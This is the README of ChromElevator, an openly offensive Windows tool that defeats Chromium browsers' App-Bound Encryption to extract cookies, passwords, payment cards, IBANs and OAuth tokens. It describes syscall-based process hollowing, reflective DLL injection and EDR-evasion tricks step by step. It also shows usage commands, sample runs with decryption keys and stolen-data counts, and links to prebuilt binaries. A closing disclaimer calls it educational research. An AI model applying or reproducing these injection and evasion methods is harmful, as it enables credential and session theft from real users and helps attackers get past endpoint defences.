# ChromElevator <sup><sub><sup>(`Chrome App-Bound Encryption Decryption`)

## 🚀 Overview

![Build Status](https://img.shields.io/badge/build-passing-brightgreen)
![License](https://img.shields.io/badge/license-MIT-blue)
![Platform](https://img.shields.io/badge/platform-Windows%20x64%20%7C%20ARM64-lightgrey)
![Languages](https://img.shields.io/badge/code-C%2B%2B%20%7C%20ASM-9cf)
[![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/xaitax/Chrome-App-Bound-Encryption-Decryption)

A post-exploitation tool demonstrating a complete, in-memory bypass of Chromium's **App-Bound Encryption (ABE)**. This project utilizes **Direct Syscall-based Reflective Process Hollowing** to launch a legitimate browser process in a suspended state, stealthily injecting a payload to hijack its identity and security context. This **Living-off-the-Land (LOTL)** technique subverts the browser's own security model. The fileless approach allows the tool to operate entirely from memory, bypassing user-land API hooks to decrypt and exfiltrate sensitive user data (cookies, passwords, payments) from modern Chromium browsers.

If you find this research valuable, I'd appreciate a coffee:  
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M61EP5XL)

## 🛡️ Core Technical Pillars

This tool's effectiveness is rooted in a combination of modern, evasion-focused techniques:

- **Direct Syscalls for Evasion:** Bypasses EDR/AV user-land hooks on standard WinAPI functions by invoking kernel functions directly. The engine dynamically resolves syscall numbers at runtime using **Hell's Gate** technique with **hash-based function matching** (no plaintext syscall names in the binary).

- **Direct Syscall-Based Process Hollowing:** A stealthy process creation and injection technique. Instead of injecting into a high-traffic, potentially monitored process, it creates a new, suspended host process. This significantly reduces the chances of detection, as all memory manipulations occur before the process begins normal execution.

- **Fileless In-Memory Payload:** The payload DLL never touches the disk on the target machine. It is stored encrypted within the injector using **ChaCha20** with **compile-time derived keys**, decrypted in-memory, and reflectively loaded, minimizing its forensic footprint and bypassing static file-based scanners.

- **Reflective DLL Injection (RDI):** A stealthy process injection method that circumvents `LoadLibrary`, thereby evading detection mechanisms that monitor module loads. The self-contained C loader resolves all of its own dependencies from memory.

- **Target-Context COM Invocation:** The lynchpin for defeating App-Bound Encryption. By executing code _within_ the trusted browser process, we inherit its identity and security context, allowing us to make legitimate-appearing calls to the ABE COM server and satisfy its path-validation security checks.

## ⚙️ Features

### Core Functionality

- 🔓 Full user-mode decryption of cookies, passwords, payment methods, IBANs, and Google OAuth tokens.
- 📁 Discovers and processes all user profiles (Default, Profile 1, etc.).
- 📝 Exports all extracted data into structured JSON files, organized by profile.
- 🔍 Comprehensive browser fingerprinting with system information.

### Stealth & Evasion

- 🛡️ **Fileless Payload Delivery:** In-memory decryption and injection of an encrypted resource.
- 🛡️ **Direct Syscall Engine:** Bypasses common endpoint defenses by avoiding hooked user-land APIs for all process operations.
- 🛡️ **Hash-Based Syscall Resolution:** No plaintext `Nt*`/`Zw*` function names in binary—uses compile-time DJB2 hashes.
- 🛡️ **Compile-Time Key Derivation:** Encryption keys derived from build metadata, unique per build.
- 🛡️ **PE Header Destruction:** Post-injection PE headers obliterated with pseudo-random data to evade memory scanners.
- 🛡️ **IPC Mimicry:** Browser-specific named pipe patterns that blend with legitimate browser IPC traffic.
- 🤫 **Process Hollowing:** Creates a benign, suspended host process for the payload, avoiding injection into potentially monitored processes.
- 👻 **Reflective DLL Injection:** Stealthily loads the payload without suspicious `LoadLibrary` calls.
- 🔒 **Proactive File-Lock Mitigation:** Automatically terminates browser utility processes that hold locks on target database files.
- 💼 **No Admin Privileges Required:** Operates entirely within the user's security context.

### Compatibility & Usability

- 🌐 Works on **Google Chrome**, **Brave**, & **Edge**.
- 💻 Natively supports **x64** and **ARM64** architectures.
- 🚀 **Standalone Operation:** Automatically creates a new browser process to host the payload, requiring no pre-existing running instances.
- 📁 Customizable output directory for extracted data.

<img width="1072" height="992" alt="image" src="https://github.com/user-attachments/assets/d3104336-f5e6-43e3-9043-01a5d3e7028f" />


## 📦 Supported & Tested Versions

| Browser            | Tested Version (x64 & ARM64) |
| ------------------ | ---------------------------- |
| **Google Chrome**  | 143.0.7499.170               |
| **Brave**          | 1.85.118 (143.0.7499.169)    |
| **Microsoft Edge** | 144.0.3719.35                |

## 🔍 Feature Support Matrix

This matrix outlines the extraction capabilities for each supported browser.

| Feature              | Google Chrome          | Brave                  | Microsoft Edge                          |
|----------------------|------------------------|------------------------|-----------------------------------------|
| **Cookies**         | ✅ ABE                | ✅ ABE                | ✅ ABE                                 |
| **Passwords**       | ✅ ABE                | ✅ ABE                | ✅ ABE                                 |
| **Payment Methods** | ✅ ABE                | ✅ ABE                | ✅ ABE                                 |
| **IBANs**           | ✅ ABE                | ✅ ABE                | ❌ N/A                                 |
| **Auth Tokens**     | ✅ Google             | ❌ N/A                | ❌ N/A                                 |

**Encryption Method Notes:**
- **ABE (App-Bound Encryption):** Using AES-256-GCM with browser-specific master keys decrypted via COM interfaces.
- **DPAPI v10:** Legacy Windows Data Protection API encryption. Microsoft Edge has not yet transitioned passwords to ABE, so older DPAPI-based decryption methods are still required and functional.
- Cookies & payments use ABE across all browsers. IBANs are not supported in Microsoft Edge.

## 🔬 Technical Workflow

The tool's execution is focused on stealth and efficiency, built around a **Direct Syscall-based Reflective Hollowing** process. This approach ensures that few high-level API calls are made and that the payload operates from within a legitimate, newly created browser process.

### **Stage 1: The Injector (`chromelevator.exe`)**

1.  **Pre-Flight & Initialization:** The injector begins by initializing its **direct syscall engine**, dynamically parsing `ntdll.dll` to resolve syscall numbers (SSNs) using hash-based matching and locate kernel transition gadgets (`syscall/ret` or `svc/ret`). It then performs a critical pre-flight check, using `NtGetNextProcess` and other syscalls to find and terminate any browser "network service" child processes. This preemptively releases file locks on the target SQLite databases.
2.  **Payload Preparation:** The core payload DLL, which is stored as a **ChaCha20-encrypted resource** with compile-time derived keys, is loaded and decrypted entirely in-memory.
3.  **Process Hollowing:** Instead of targeting an existing process, the injector creates a new instance of the target browser in a **`CREATE_SUSPENDED`** state (`CreateProcessW`). This pristine, suspended process serves as the host for our payload.
4.  **Reflective Injection via Syscalls:** Using the direct syscall engine, the injector performs a series of stealthy actions on the suspended process:
    - It allocates memory using `NtAllocateVirtualMemory` (direct syscall).
    - It writes the decrypted payload DLL into the allocated space with `NtWriteVirtualMemory`.
    - It changes the memory region's permissions to executable using `NtProtectVirtualMemory` (direct syscall).
    - It creates a **named pipe** for communication and writes the pipe's name into the target's memory.
5.  **Execution & Control:** A new thread is created in the target process using `NtCreateThreadEx`. The thread's start address points directly to the payload's `Bootstrap` export, with the address of the remote pipe name as its argument. The original main thread of the browser remains suspended and is never resumed. The injector then waits for the payload to connect back to the pipe.

### **Stage 2: The Injected Payload (In-Memory)**

1.  **Bootstrapping:** The `Bootstrap` reflective loader executes, functioning as a custom in-memory PE loader with enhanced stealth:
    - Allocates new memory for the payload using **direct syscalls** to `NtAllocateVirtualMemory` (bypassing hooked `VirtualAlloc`).
    - Correctly maps the DLL's sections and performs base relocations.
    - Resolves its Import Address Table (IAT) by parsing the PEB and hashing function names.
    - Sets section permissions using **direct syscalls** to `NtProtectVirtualMemory`.
    - **Destroys PE headers** by overwriting DOS/NT headers with pseudo-random data, eliminating MZ signature from memory.
    - Finally, invokes the payload's `DllMain`.
2.  **Connection & Setup:** The `DllMain` spawns a new thread that immediately connects to the named pipe handle passed by the injector. It reads the configuration, including the output path, sent by the injector. All subsequent logs and status updates are relayed back through this pipe.
3.  **Target-Context COM Hijack:** Now running natively within the browser process, the payload instantiates the browser's internal `IOriginalBaseElevator` or `IEdgeElevatorFinal` COM server. As the call originates from a trusted process path, all of the server's security checks are passed.
4.  **Master Key Decryption:** The payload calls the `DecryptData` method on the COM interface, providing the `app_bound_encrypted_key` it reads from the `Local State` file. The COM server dutifully decrypts the key and returns the plaintext AES-256 master key to the payload.
5.  **Data Exfiltration:** Armed with the AES key, the payload enumerates all user profiles (`Default`, `Profile 1`, etc.). For each profile, it queries the relevant SQLite databases (`Cookies`, `Login Data`, `Web Data`), decrypts the data blobs using AES-256-GCM, and formats the secrets as JSON. The results are written directly to the output directory specified by the injector.
6.  **Shutdown:** After processing all profiles, the payload sends a completion signal to the injector over the pipe and calls `FreeLibraryAndExitThread` to clean up. The injector, upon receiving the signal, terminates the parent host process with `NtTerminateProcess`.

## 🔧 Build Instructions

This project uses a simple, robust build script that handles all compilation and resource embedding automatically.

1. **Clone** this repository.

2. Open a **Developer Command Prompt for VS** (or any MSVC‑enabled shell).

3. Run the build script `make.bat` from the project root.

**Build Options:**
- `make.bat` - Full build (default)
- `make.bat clean` - Remove all build artifacts
- `make.bat build_encryptor_only` - Build only the encryptor (used by CI)
- `make.bat build_target_only` - Build payload and injector (used by CI)

### Automated Builds with GitHub Actions

This project uses GitHub Actions to automatically build the injector executable (`chromelevator.exe`) for both **x64** and **ARM64** architectures.

You can find the latest pre-compiled binaries on the [**Releases page**](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases). The executables for both architectures are packaged together in a single, convenient .zip file.

**Release Package Contents:**

- `chromelevator_x64.exe`
- `chromelevator_arm64.exe`

## 🚀 Usage

```bash
PS> .\chromelevator.exe --help

_________ .__                         ___________.__                       __
\_   ___ \|  |_________  ____   _____ \_   _____/|  |   _______  _______ _/  |_  ___________
/    \  \/|  |  \_  __ \/  _ \ /     \ |    __)_ |  | _/ __ \  \/ /\__  \\   __\/  _ \_  __ \
\     \___|   Y  \  | \(  <_> )  Y Y  \|        \|  |_\  ___/\   /  / __ \|  | (  <_> )  | \/
 \______  /___|  /__|   \____/|__|_|  /_______  /|____/\___  >\_/  (____  /__|  \____/|__|
        \/     \/                   \/        \/           \/           \/
 Direct Syscall-Based Reflective Hollowing
 x64 & ARM64 | v0.17.1 by @xaitax

  Usage: chromelevator.exe [options] <chrome|edge|brave|all>

  Options:
    -v, --verbose      Show detailed output
    -f, --fingerprint  Extract browser fingerprint
    -o, --output-path  Custom output directory
```

### Options

- `--output-path <path>` or `-o <path>`
  Specifies the base directory for output files.
  Defaults to `.\output\` relative to the injector's location.
  Data will be organized into subfolders: `<path>/<BrowserName>/<ProfileName>/`.

- `--verbose` or `-v`
  Enable extensive debugging output from the injector.

- `--fingerprint` or `-f`
  Extract comprehensive browser fingerprinting data including version, extensions, security settings, and system information.
  Results saved to `fingerprint.json` in the browser's output directory.

- `--help` or `-h`
  Show this help message.

### Normal Run

```bash
PS> .\chromelevator.exe all

_________ .__                         ___________.__                       __
\_   ___ \|  |_________  ____   _____ \_   _____/|  |   _______  _______ _/  |_  ___________
/    \  \/|  |  \_  __ \/  _ \ /     \ |    __)_ |  | _/ __ \  \/ /\__  \\   __\/  _ \_  __ \
\     \___|   Y  \  | \(  <_> )  Y Y  \|        \|  |_\  ___/\   /  / __ \|  | (  <_> )  | \/
 \______  /___|  /__|   \____/|__|_|  /_______  /|____/\___  >\_/  (____  /__|  \____/|__|
        \/     \/                   \/        \/           \/           \/
 Direct Syscall-Based Reflective Hollowing
 x64 & ARM64 | v0.17.1 by @xaitax

  ┌──── Brave ──────────────────────────────────────
  │
  │ Decryption Key
  │ 2522A3C1730EA8EE84BAAD1994DB31E20437D9DCF27628997598BB5B86F73DCD
  │
  ├── Default
  │   Cookies     2439/2460
  │   Passwords   46
  │   Cards       1
  │   IBANs       1
  │
  └── 2439 cookies, 46 passwords, 1 cards, 1 IBANs (1 profile)
      C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Brave

  ┌──── Chrome ──────────────────────────────────────
  │
  │ Decryption Key
  │ 3FA14DC988A34C85BDB872159B739634CB7E56F8E34449C1494297B9B629D094
  │
  ├── Default
  │   Cookies     378/382
  │   Passwords   1
  │
  ├── Profile 1
  │   Cookies     815/820
  │   Passwords   789
  │   Cards       1
  │   IBANs       1
  │   Tokens      1
  │
  └── 1193 cookies, 790 passwords, 1 cards, 1 IBANs, 1 tokens (2 profiles)
      C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome

  ┌──── Edge ──────────────────────────────────────
  │
  │ Decryption Key
  │ B0334FAD7F5805362CB4C44B144A95AB7A68F7346EF99EB3F175F09DB08C8FD9
  │
  ├── Default
  │   Cookies     214/216
  │   Passwords   2
  │   Cards       1
  │
  ├── Profile 1
  │   Cookies     25
  │
  └── 239 cookies, 2 passwords, 1 cards (2 profiles)
      C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Edge
```

### Verbose

```bash
PS> .\chromelevator.exe -v -f chrome

_________ .__                         ___________.__                       __
\_   ___ \|  |_________  ____   _____ \_   _____/|  |   _______  _______ _/  |_  ___________
/    \  \/|  |  \_  __ \/  _ \ /     \ |    __)_ |  | _/ __ \  \/ /\__  \\   __\/  _ \_  __ \
\     \___|   Y  \  | \(  <_> )  Y Y  \|        \|  |_\  ___/\   /  / __ \|  | (  <_> )  | \/
 \______  /___|  /__|   \____/|__|_|  /_______  /|____/\___  >\_/  (____  /__|  \____/|__|
        \/     \/                   \/        \/           \/           \/
 Direct Syscall-Based Reflective Hollowing
 x64 & ARM64 | v0.17.1 by @xaitax

  ┌──── Chrome ──────────────────────────────────────
  │ Terminating browser network services...
  │   [+] Network services terminated
  │ Creating suspended process: C:\Program Files\Google\Chrome\Application\chrome.exe
  │   [+] Process created (PID: 13020)
  │   [+] IPC pipe established: \\.\pipe\chrome.sync.26370.18285.8B20
  │ Deriving runtime decryption keys...
  │   [+] Payload decrypted (1048 KB)
  │   [+] Bootstrap entry point resolved (offset: 0x2a790)
  │ Allocating memory in target process via syscall...
  │   [+] Memory allocated at 0x2245a600000 (1052 KB)
  │   [+] Payload + parameters written
  │   [+] Memory protection set to PAGE_EXECUTE_READ
  │ Creating remote thread via syscall...
  │   [+] Thread created (entry: 0x2245a62a790)
  │ Awaiting payload connection...
  │   [+] Payload connected
  │ Running in Chrome
  │
  │ Decryption Key
  │ 3FA14DC988A34C85BDB872159B739634CB7E56F8E34449C1494297B9B629D094
  │
  ├── Default
  │   Size        13 MB
  │   Cookies     378/382
  │   Passwords   1
  │
  ├── Profile 1
  │   Size        739 MB
  │   Cookies     815/820
  │   Passwords   789
  │   Cards       1
  │   IBANs       1
  │   Tokens      1
  │ Extracting comprehensive fingerprint...
  │ Fingerprint saved to fingerprint.json
  │
  └── 1193 cookies, 790 passwords, 1 cards, 1 IBANs, 1 tokens (2 profiles)
      C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome
```

## 📂 Data Extraction

Once decryption completes, data is saved to the specified output path (defaulting to `.\output\` if not specified via `--output-path`). Files are organized as follows:

**Base Path:** `YOUR_CHOSEN_PATH` (e.g., `.\output\` or the path you provide)
**Structure:** <Base Path>/<BrowserName>/<ProfileName>/<data_type>.json

Example paths (assuming default output location):

- 🍪 **Cookies (Chrome Default profile):** .\output\Chrome\Default\cookies.json
- 🔑 **Passwords (Edge Profile 1):** .\output\Edge\Profile 1\passwords.json
- 💳 **Payment Methods (Brave Default profile):** .\output\Brave\Default\payments.json
- 🏦 **IBANs (Chrome Profile 1):** .\output\Chrome\Profile 1\iban.json

### 🍪 Cookie Extraction

Each cookie file is a JSON array of objects:

```json
[
  {
    "host": "accounts.google.com",
    "name": "ACCOUNT_CHOOSER",
    "path": "/",
    "expires": 1766591611,
    "value": "AFx_qI781-…"
  },
  {
    "host": "mail.google.com",
    "name": "OSID",
    "path": "/mail",
    "expires": 1766591611,
    "value": "g.a000uwj5ufIS…"
  },
  …
]
```

### 🔑 Password Extraction

Each password file is a JSON array of objects:

```json
[
  {
    "url": "https://example.com/login",
    "user": "user@example.com",
    "pass": "••••••••••"
  },
  …
]
```

### 💳 Payment Method Extraction

Each payment file is a JSON array of objects:

```json
[
  {
    "name": "John Doe",
    "month": 12,
    "year": 2030,
    "number": "••••••••••1234",
    "cvc": "•••"
  },
  …
]
```

### 🏦 IBAN Extraction

Each IBAN file is a JSON array of objects:

```json
[
  {
    "nickname": "UK Test",
    "iban": "GB33BUKB20201555555555"
  }
]
```

### 🎟️ Token Extraction

Each token file is a JSON array of objects containing the service, the decrypted token, and the binding key (if present):

```json
[
  {
    "service": "AccountId-112823413702122221871",
    "token": "1//03VJGN_vL2FR5CgYIARAAGAMSNwF-L9IrtiyH_tmtOneETFya5GEGiewlEMrLwDMuOl56zRoShNE77DfyOXhofn5Ryo_...",
    "binding_key": ""
  }
]
```

### 🔍 Browser Fingerprinting

When using the `--fingerprint` or `-f` flag, a comprehensive metadata report is generated:

```json
{
  "browser": "Chrome",
  "executable_path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
  "browser_version": "143.0.7499.170",
  "user_data_path": "C:\\Users\\username\\AppData\\Local\\Google\\Chrome\\User Data",
  "sync_enabled": false,
  "enterprise_managed": true,
  "update_channel": "stable",
  "hardware_acceleration": false,
  "metrics_enabled": false,
  "autofill_enabled": true,
  "password_manager_enabled": false,
  "safe_browsing_enabled": true,
  "do_not_track": false,
  "third_party_cookies_blocked": false,
  "translate_enabled": true,
  "installed_extensions_count": 2,
  "extension_ids": ["ghbmnnjooekpmoecnnnilnnbdlolhkhi", "nmmhkkegccagdldgiimedpiccmgmieda"],
  "profile_count": 2,
  "computer_name": "DESKTOP-ABC123",
  "windows_user": "username",
  "os_version": "10.0.26220",
  "architecture": "ARM64",
  "last_config_update": 1766578854,
  "extraction_timestamp": 1766591611,
  "extraction_complete": true
}
```

This data provides intelligence about the browser's configuration, security posture, and system context.

## 📚 In-Depth Technical Analysis & Research

For a comprehensive understanding of Chrome's App-Bound Encryption, the intricacies of its implementation, the detailed mechanics of this tool's approach, and a broader discussion of related security vectors, please refer to my detailed research paper:

1.  ➡️ **[Chrome App-Bound Encryption (ABE) - Technical Deep Dive & Research Notes](docs/RESEARCH.md)**

    This document covers:

    - The evolution from DPAPI to ABE.
    - A step-by-step breakdown of the ABE mechanism, including `IElevator` COM interactions and key wrapping.
    - Detailed methodology of the DLL injection strategy used by this tool.
    - Analysis of encrypted data structures and relevant Chromium source code insights.
    - Discussion of alternative decryption vectors and Chrome's evolving defenses.

2.  ➡️ **[The Curious Case of the Cantankerous COM: Decrypting Microsoft Edge's App-Bound Encryption](docs/The_Curious_Case_of_the_Cantankerous_COM_Decrypting_Microsoft_Edge_ABE.md)**

    This article details the specific challenges and reverse engineering journey undertaken to achieve reliable ABE decryption for Microsoft Edge. It includes:

    - An account of the initial issues and misleading error codes (`E_INVALIDARG`, `E_NOINTERFACE`).
    - The process of using COM type library introspection (with Python `comtypes`) to uncover Edge's unique `IElevatorEdge` vtable structure and inheritance.
    - How this insight led to tailored C++ interface stubs for successful interaction with Edge's ABE service.
    - A practical look at debugging tricky COM interoperability issues.

3.  ➡️ **[COMrade ABE: Your Field Manual for App-Bound Encryption's COM Underbelly](docs/COMrade_ABE_Field_Manual.md)**

    This field manual introduces **COMrade ABE**, a Python-based dynamic analyzer for ABE COM interfaces, and dives into its practical applications:

    - Explains the necessity for dynamic COM interface analysis due to browser variations and updates.
    - Details COMrade ABE's methodology: registry scanning for service discovery, Type Library loading and parsing, and heuristic-based ABE method signature matching.
    - Provides a comprehensive guide to interpreting COMrade ABE's output, including CLSIDs, IIDs (standard and C++ style), and the significance of verbose output details like VTable offsets, defining interfaces, and full inheritance chains.
    - Highlights the utility of the auto-generated C++ stubs (`--output-cpp-stub`) for rapid development and research.
    - Discusses how COMrade ABE aids in adapting to ABE changes, analyzing new Chromium browsers, and understanding vendor-specific COM customizations.

## 🔗 Additional Resources & Research

This project builds upon the work and analysis of the wider security community.

- **Official Documentation & Announcements:**

  - [Google Security Blog: Improving the security of Chrome cookies on Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
  - [Design Doc: Chrome app-bound encryption Service](https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view)

- **Community Research & Acknowledgment:**
  - Proof of concept by [snovvcrash](https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824)

## 🗒️ Changelog

All notable changes to this project are documented in the [**CHANGELOG**](CHANGELOG.md) file. This includes version history, new features, bug fixes, and security improvements.

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 💡 Project Philosophy & Disclaimer

> [!IMPORTANT]
> This is a hobby project created for educational and security research purposes. It serves as a personal learning experience and a playing field for exploring advanced Windows concepts.
>
> **This tool is NOT intended to be a fully-featured infostealer or a guaranteed EDR evasion tool.** While it employs advanced techniques, its primary goal is to demonstrate and dissect the ABE mechanism, not to provide operational stealth for malicious use. Please ensure compliance with all relevant legal and ethical guidelines.
